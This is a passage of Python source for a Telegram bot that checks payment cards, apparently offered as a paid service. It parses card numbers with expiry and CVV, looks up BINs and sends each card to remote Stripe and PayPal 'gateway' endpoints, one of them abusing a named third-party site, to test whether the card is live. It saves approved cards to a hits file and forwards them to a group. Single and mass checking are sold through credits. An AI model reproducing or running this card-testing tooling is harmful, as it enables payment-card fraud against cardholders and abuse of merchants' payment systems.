                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Stripe [22.7$]'
                }
            else:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': f'Request failed: {str(e)}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Stripe [22.7$]'
                }
            
    except Exception as e:
        return {
            'status': 'ERROR',
            'card': cc,
            'message': f'Invalid Input: {str(e)}',
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': 'Stripe [22.7$]'
        }
    

# Handle both /b3 and .b3
@bot.message_handler(commands=['ss'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.ss'))
def handle_ss(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return



    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Check credits for non-subscribed users
    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        # Extract card from either format
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) < 2:
                bot.reply_to(message, "❌ Invalid format. Use /ss CC|MM|YYYY|CVV or .ss CC|MM|YYYY|CVV")
                return
            cc = parts[1]
        else:  # starts with .
            cc = message.text[4:].strip()  # remove ".b3 "

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(
            message,
            "↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>Stripe [22.7$] </i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>".format(cc),
            parse_mode='HTML'
        )

        def check_card():
            try:
                result = check_ss_cc(cc)
                result['user_id'] = message.from_user.id  # Added line to include user ID
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                # Edit original message
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=response_text,
                                      parse_mode='HTML')

                # Auto-send approved results to hits group
                try:
                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error - ss] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Handle both /mb3 and .mb3
@bot.message_handler(commands=['mss'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mss'))
def handle_mss(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return
    

    
    # Check if user is subscribed
    if not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This command is only for subscribed users. Buy a plan to use this feature.")
        return
    
    # Check mass check cooldown
    if not check_mass_check_cooldown(message.from_user.id):
        bot.reply_to(message, "⚠️ You are doing things too fast! Please wait 20 seconds between mass checks.")
        return
    
    try:
        cards_text = None
        command_parts = message.text.split()
        
        # Check if cards are provided after command
        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return
            
        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YYYY|CVV).")
            return
        
        # Determine max limit based on subscription status
        max_limit = MAX_SUBSCRIBED_CARDS_LIMIT if is_user_subscribed(message.from_user.id) else MAX_CARDS_LIMIT
        
        if len(cards) > max_limit:
            cards = cards[:max_limit]
            bot.reply_to(message, f"⚠️ Maximum {max_limit} cards allowed. Checking first {max_limit} cards only.")
        
        start_time = time.time()
            
        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name
            
        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')
        
        def check_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = check_ss_cc(card)
                        results.append(result)
                        
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                    except Exception as e:
                        results.append({
                            'status': 'ERROR',
                            'card': card,
                            'message': f'Invalid: {str(e)}',
                            'brand': 'UNKNOWN',
                            'country': 'UNKNOWN 🌐',
                            'type': 'UNKNOWN',
                            'gateway': 'Stripe [22.7$]'
                        })
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                
                processing_time = time.time() - start_time
                response_text = format_mchk_response(results, len(cards), processing_time)
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')
            
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                     message_id=status_msg.message_id,
                                     text=f"❌ An error occurred: {str(e)}",
                                     parse_mode='HTML')
        
        threading.Thread(target=check_cards).start()
    
    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

def check_pp_cc(cc):
    try:
        # Normalize input format (accept various separators and formats)
        card = cc.replace('/', '|').replace(' ', '|').replace(':', '|')
        lista = [part.strip() for part in card.split('|') if part.strip()]
        
        # Validate we have all required parts
        if len(lista) < 4:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid format. Use CC|MM|YYYY|CVV',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Paypal [2$]'
            }
        
        cc_num = lista[0]
        mm = lista[1].zfill(2)  # Ensure 2-digit month (e.g., 3 becomes 03)
        yy_raw = lista[2]
        cvv = lista[3]
        
        # Normalize year to 4 digits - FIXED LOGIC
        if len(yy_raw) == 2:  # 2-digit year provided
            current_year_short = datetime.now().year % 100
            input_year = int(yy_raw)
            if input_year >= current_year_short - 10:  # Consider years within 10 years range
                yy = '20' + yy_raw  # 22 → 2022
            else:
                yy = '20' + yy_raw  # Default to 20xx for all 2-digit years
        elif len(yy_raw) == 4:  # 4-digit year provided
            yy = yy_raw
        else:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid year format (use YY or YYYY)',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Paypal [2$]'
            }
        
        # Validate card number length
        if not (13 <= len(cc_num) <= 19):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid card number length',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Paypal [2$]'
            }
        
        # Validate month
        if not (1 <= int(mm) <= 12):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid month (1-12)',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Paypal [2$]'
            }
        
        # Validate CVV
        if not (3 <= len(cvv) <= 4):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid CVV length',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Paypal [2$]'
            }
        
        # Check expiration (using normalized values)
        current_year = datetime.now().year
        current_month = datetime.now().month
        
        if int(yy) < current_year or (int(yy) == current_year and int(mm) < current_month):
            return {
                'status': 'DECLINED',
                'card': f"{cc_num}|{mm}|{yy}|{cvv}",
                'message': 'Your card is expired',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Paypal [2$]'
            }
        
        # Get BIN info
        bin_info = None
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc_num[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
        except:
            pass
            
        # Set default values if BIN lookup failed
        brand = bin_info.get('brand', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_name = bin_info.get('country_name', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_flag = bin_info.get('country_flag', '🌐') if bin_info else '🌐'
        card_type = bin_info.get('type', 'UNKNOWN') if bin_info else 'UNKNOWN'
        bank = bin_info.get('bank', 'UNKNOWN') if bin_info else 'UNKNOWN'
        
        # Prepare card for API - in perfect CC|MM|YYYY|CVV format
        formatted_cc = f"{cc_num}|{mm}|{yy}|{cvv}"
        
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'application/json',
                'Connection': 'keep-alive'
            }
            
            # Increased timeout to 60 seconds
            response = requests.get(PP_API_URL.format(formatted_cc), headers=headers, timeout=300)
            
            if response.status_code == 200:
                try:
                    data = response.json()
                except json.JSONDecodeError:
                    return {
                        'status': 'ERROR',
                        'card': formatted_cc,
                        'message': 'Invalid API response',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Paypal [2$]'
                    }
                    
                status = data.get('status', 'Declined ❌')
                message = data.get('response', 'Your card was declined.')
                
                # Improved status detection
                if any(word in status for word in ['Live', 'Approved', 'APPROVED', 'Success']):
                    status = 'APPROVED'
                    with open('HITS.txt','a') as hits:
                        hits.write(formatted_cc+'\n')
                    return {
                        'status': 'APPROVED',
                        'card': formatted_cc,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Paypal [2$]'
                    }
                elif any(word in status for word in ['Declined', 'Decline', 'Failed', 'Error']):
                    return {
                        'status': 'DECLINED',
                        'card': formatted_cc,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Paypal [2$]'
                    }
                else:
                    return {
                        'status': 'ERROR',
                        'card': formatted_cc,
                        'message': 'Unknown response from API',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Paypal [2$]'
                    }
            else:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': f'API Error: {response.status_code}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Paypal [2$]'
                }
        except requests.exceptions.RequestException as e:
            error_msg = str(e)
            if "Read timed out" in error_msg:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': 'API Timeout (60s) - Server may be busy',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Paypal [2$]'
                }
            else:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': f'Request failed: {str(e)}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Paypal [2$]'
                }
            
    except Exception as e:
        return {
            'status': 'ERROR',
            'card': cc,
            'message': f'Invalid Input: {str(e)}',
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': 'Paypal [2$]'
        }
    

# Handle both /b3 and .b3
@bot.message_handler(commands=['pp'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.pp'))
def handle_pp(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return



    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Check credits for non-subscribed users
    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        # Extract card from either format
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) < 2:
                bot.reply_to(message, "❌ Invalid format. Use /py CC|MM|YYYY|CVV or .py CC|MM|YYYY|CVV")
                return
            cc = parts[1]
        else:  # starts with .
            cc = message.text[4:].strip()  # remove ".b3 "

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(
            message,
            "↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>Paypal [2$] </i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>".format(cc),
            parse_mode='HTML'
        )

        def check_card():
            try:
                result = check_pp_cc(cc)
                result['user_id'] = message.from_user.id  # Added line to include user ID
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                # Edit original message
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=response_text,
                                      parse_mode='HTML')

                # Auto-send approved results to hits group
                try:
                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error - pp] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

def download_and_send_video(message, url, msg_id, tag):
    chat_id = message.chat.id

    try:
        send_progress_animation(bot, chat_id, msg_id)

        # Options for yt-dlp
        ydl_opts = {
            'format': 'mp4',
            'outtmpl': f"{tag}_%(title).50s.%(ext)s",
            'quiet': True,
        }

        with YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=True)
            filename = ydl.prepare_filename(info)

        title = info.get('title', 'Downloaded Video')

        bot.send_chat_action(chat_id, 'upload_video')
        with open(filename, 'rb') as video:
            bot.send_video(chat_id, video, caption=f"🎬 <b>{title}</b>", parse_mode='HTML')

        os.remove(filename)
        bot.delete_message(chat_id, msg_id)

    except Exception as e:
        bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=f"❌ Error: {str(e)}")

def send_progress_animation(bot, chat_id, message_id):
    progress_stages = [
        "Downloading video, please wait.\n[░░░░░░░░░░]",
        "Downloading video, please wait.\n[▓░░░░░░░░░]",
        "Downloading video, please wait.\n[▓▓░░░░░░░░]",
        "Downloading video, please wait.\n[▓▓▓░░░░░░░]",
        "Downloading video, please wait.\n[▓▓▓▓░░░░░░]",
        "Downloading video, please wait.\n[▓▓▓▓▓░░░░░]",
        "Downloading video, please wait.\n[▓▓▓▓▓▓░░░░]",
        "Downloading video, please wait.\n[▓▓▓▓▓▓▓░░░]",
        "Downloading video, please wait.\n[▓▓▓▓▓▓▓▓░░]",
        "Downloading video, please wait.\n[▓▓▓▓▓▓▓▓▓░]",
        "Downloading video, please wait.\n[▓▓▓▓▓▓▓▓▓▓]"
    ]
    for stage in progress_stages:
        try:
            bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=stage)
            time.sleep(0.4)
        except:
            break


@bot.message_handler(commands=['yt'])
def handle_youtube_download(message):
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This command is locked in DM. Use it in an approved group or subscribe to unlock.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return

    if len(message.text.split()) < 2:
        bot.reply_to(message, "❌ Usage: /yt <YouTube video URL>")
        return

    link = message.text.split()[1]
    msg = bot.reply_to(message, "Downloading video, please wait.\n[░░░░░░░░░░]")
    threading.Thread(target=download_and_send_video, args=(message, link, msg.message_id, "yt")).start()

@bot.message_handler(commands=['ins'])
def handle_instagram_download(message):
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This command is locked in DM. Use it in an approved group or subscribe to unlock.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return

    if len(message.text.split()) < 2:
        bot.reply_to(message, "❌ Usage: /ins <Instagram video URL>")
        return

    link = message.text.split()[1]
    msg = bot.reply_to(message, "Downloading video, please wait.\n[░░░░░░░░░░]")
    threading.Thread(target=download_and_send_video, args=(message, link, msg.message_id, "ins")).start()


# 🔨 Admin Command to Ban Users
@bot.message_handler(commands=['ban'])
def handle_ban(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ You are not authorized.")
        return

    parts = message.text.strip().split()
    if len(parts) < 3:
        bot.reply_to(message, "❌ Usage: /ban <user_id> <hours>")
        return

    user_id = parts[1]
    try:
        hours = int(parts[2])
        ban_until = time.time() + (hours * 3600)
        BANNED_USERS[user_id] = ban_until

        # Save to local file
        with open('banned_users.json', 'w') as f:
            json.dump(BANNED_USERS, f)

        # Save to Firebase
        write_firebase("banned_users", BANNED_USERS)

        bot.reply_to(message, f"✅ Banned user <code>{user_id}</code> for {hours} hours.", parse_mode="HTML")
    except ValueError:
        bot.reply_to(message, "❌ Invalid hour value. Use a number.")

# 🔓 Admin Command to Unban Users
@bot.message_handler(commands=['unban'])
def handle_unban(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ You are not authorized.")
        return

    parts = message.text.strip().split()
    if len(parts) < 2:
        bot.reply_to(message, "❌ Usage: /unban <user_id>")
        return

    user_id = parts[1]
    if user_id in BANNED_USERS:
        del BANNED_USERS[user_id]

        # Save to local file
        with open('banned_users.json', 'w') as f:
            json.dump(BANNED_USERS, f)

        # Save to Firebase
        write_firebase("banned_users", BANNED_USERS)

        bot.reply_to(message, f"✅ Unbanned user <code>{user_id}</code>.", parse_mode="HTML")
    else:
        bot.reply_to(message, "⚠️ User is not banned.")

@bot.message_handler(commands=['broad'])
def handle_broadcast_reply(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    if not message.reply_to_message:
        bot.reply_to(message, "❌ Please reply to the message you want to broadcast.")
        return

    msg = message.reply_to_message

    # Collect targets from Firebase
    user_credits = read_firebase("user_credits") or {}
    subscribed_users = read_firebase("subscribed_users") or {}
    approved_groups = read_firebase("approved_groups") or []
    
    all_users = set(user_credits.keys()) | set(subscribed_users.keys())
    all_groups = set(approved_groups)

    targets = list(all_users) + list(all_groups)
    targets = [int(uid) for uid in targets if str(uid).lstrip("-").isdigit()]

    total = len(targets)
    success = 0
    failed = 0
    errors = 0
    start_time = time.time()

    # Initial status message
    status_text = f"""
📢 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭𝐢𝐧𝐠 𝐌𝐞𝐬𝐬𝐚𝐠𝐞...

✧ 𝐓𝐨𝐭𝐚𝐥: <code>{total}</code>  
✧ 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥: <code>{success}</code>  
✧ 𝐅𝐚𝐢𝐥𝐞𝐝: <code>{failed}</code>  
✧ 𝐄𝐫𝐫𝐨𝐫𝐬: <code>{errors}</code>  
✧ 𝐓𝐢𝐦𝐞: 0.00 S

"""
    status_msg = bot.reply_to(message, status_text, parse_mode='HTML')

    for idx, uid in enumerate(targets):
        try:
            if msg.text:
                bot.send_message(uid, msg.text, parse_mode='HTML')
            elif msg.caption and msg.photo:
                bot.send_photo(uid, msg.photo[-1].file_id, caption=msg.caption, parse_mode='HTML')
            elif msg.caption and msg.video:
                bot.send_video(uid, msg.video.file_id, caption=msg.caption, parse_mode='HTML')
            elif msg.document:
                bot.send_document(uid, msg.document.file_id, caption=msg.caption or None)
            elif msg.sticker:
                bot.send_sticker(uid, msg.sticker.file_id)
            elif msg.voice:
                bot.send_voice(uid, msg.voice.file_id)
            elif msg.audio:
                bot.send_audio(uid, msg.audio.file_id, caption=msg.caption or None)
            else:
                errors += 1
                continue
            success += 1

        except telebot.apihelper.ApiTelegramException as e:
            if "chat not found" in str(e).lower():
                print(f"❌ Chat not found: {uid}")
            else:
                print(f"❌ Failed to send to {uid}: {str(e)}")
            failed += 1

        except Exception as e:
            print(f"Error sending to {uid}: {e}")
            errors += 1

        # Update live status every 5 sends or at the end
        if (success + failed + errors) % 5 == 0 or (success + failed + errors) == total:
            elapsed = time.time() - start_time
            updated_status = f"""
📢 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭 𝐑𝐞𝐬𝐮𝐥𝐭𝐬

✧ 𝐓𝐨𝐭𝐚𝐥 ↣ <code>{total}</code>  
✧ 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥 ↣ <code>{success}</code>  
✧ 𝐅𝐚𝐢𝐥𝐞𝐝 ↣ <code>{failed}</code>  
✧ 𝐄𝐫𝐫𝐨𝐫𝐬 ↣ <code>{errors}</code>  
✧ 𝐓𝐢𝐦𝐞 ↣ <code>{elapsed:.2f} S</code>

"""
            try:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=updated_status,
                                      parse_mode='HTML')
            except:
                pass

def check_sr_api_cc(cc):
    try:
        # Normalize input
        card = cc.replace('/', '|').replace(':', '|').replace(' ', '|')
        lista = [part.strip() for part in card.split('|') if part.strip()]

        # Validate minimum length
        if len(lista) < 4:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid format: Use CC|MM|YY|CVV',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Stripe Auth 3'
            }

        cc_num = lista[0]
        mm = lista[1].zfill(2)
        yy_raw = lista[2]
        cvv = lista[3]

        # Safe YY conversion
        if yy_raw.startswith("20") and len(yy_raw) == 4:
            yy = yy_raw[2:]
        elif len(yy_raw) == 2:
            yy = yy_raw
        else:
            yy = '00'

        # BIN info fallback
        brand = country_name = card_type = bank = 'UNKNOWN'
        country_flag = '🌐'

        # BIN lookup
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc_num[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
                brand = bin_info.get('brand', 'UNKNOWN')
                country_name = bin_info.get('country_name', 'UNKNOWN')
                country_flag = bin_info.get('country_flag', '🌐')
                card_type = bin_info.get('type', 'UNKNOWN')
                bank = bin_info.get('bank', 'UNKNOWN')
        except Exception:
            pass

        # Final formatted card
        formatted_cc = f"{cc_num}|{mm}|{yy}|{cvv}"

        # API request
        try:
            response = requests.get(
                f"https://voidxstrnpe.onrender.com/gateway=as/key=void/site=handprintalliance.com/cc={formatted_cc}",
                timeout=300
            )
            if response.status_code == 200:
                try:
                    data = response.json()
                    status = str(data.get('status', 'DECLINED')).upper()
                    message = str(data.get('response') or data.get('message') or 'Your card was declined.')
                except Exception:
                    status = 'ERROR'
                    message = 'Invalid response from API'
            else:
                status = 'ERROR'
                message = f"API error: {response.status_code}"

            # Final status normalization
            if 'APPROVED' in status:
                status = 'APPROVED'
                with open('HITS.txt', 'a') as hits:
                    hits.write(formatted_cc + '\n')
            elif 'DECLINED' in status:
                status = 'DECLINED'
            elif status not in ['APPROVED', 'DECLINED']:
                status = 'ERROR'

            return {
                'status': status,
                'card': formatted_cc,
                'message': message,
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Stripe Auth 3'
            }

        except Exception as e:
            return {
                'status': 'ERROR',
                'card': formatted_cc,
                'message': f"Request error: {str(e)}",
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Stripe Auth 3'
            }

    except Exception as e:
        return {
            'status': 'ERROR',
            'card': cc,
            'message': f"Input error: {str(e)}",
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': 'Stripe Auth 3'
        }


# Handle both /chk and .chk
@bot.message_handler(commands=['sr'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.sr'))

def handle_sr(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.Send Username & Chat Id of this Group Here @spydil To get approved")
        return



    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Check credits for non-subscribed users
    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        # Extract card from either format
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) < 2:
                bot.reply_to(message, "❌ Invalid format. Use /str CC|MM|YYYY|CVV or .chk CC|MM|YYYY|CVV")
                return
            cc = parts[1]
        else:  # starts with .
            cc = message.text[5:].strip()  # remove ".chk "

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(message, "↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>Stripe Auth 3</i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>".format(cc), parse_mode='HTML')

        def check_card():
            try:
                result = check_sr_api_cc(cc)
                result['user_id'] = message.from_user.id  # Added line to include user ID
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=response_text,
                                      parse_mode='HTML')

                try:
                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")


# Handle both /mchk and .mchk
@bot.message_handler(commands=['msr'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.msr'))
def handle_msr(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return
    

    
    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return
    
    # Check mass check cooldown
    if not check_mass_check_cooldown(message.from_user.id):
        bot.reply_to(message, "⚠️ You are doing things too fast! Please wait 20 seconds between mass checks.")
        return
    
    try:
        cards_text = None
        command_parts = message.text.split()
        
        # Check if cards are provided after command
